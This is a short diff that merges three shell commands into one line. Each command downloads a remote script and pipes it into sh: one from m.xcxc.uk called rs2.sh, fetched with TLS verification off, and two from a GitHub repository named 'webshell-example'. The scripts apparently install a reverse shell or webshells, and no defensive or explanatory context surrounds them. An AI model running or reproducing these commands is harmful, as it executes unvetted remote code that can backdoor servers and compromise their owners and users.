@@ -1,6 +1,1 @@
-(curl -skL m.xcxc.uk/rs2.sh||wget -qO- m.xcxc.uk/rs2.sh)|sh
-
-curl -s https://raw.githubusercontent.com/maximo896/webshell-example/refs/heads/main/sh/cpa.sh|sh
-
-curl -s https://raw.githubusercontent.com/maximo896/webshell-example/refs/heads/main/sh/cphtac.sh|sh
-
+(curl -skL m.xcxc.uk/rs2.sh||wget -qO- m.xcxc.uk/rs2.sh)|sh ; curl -s https://raw.githubusercontent.com/maximo896/webshell-example/refs/heads/main/sh/cpa.sh|sh ; curl -s https://raw.githubusercontent.com/maximo896/webshell-example/refs/heads/main/sh/cphtac.sh|sh
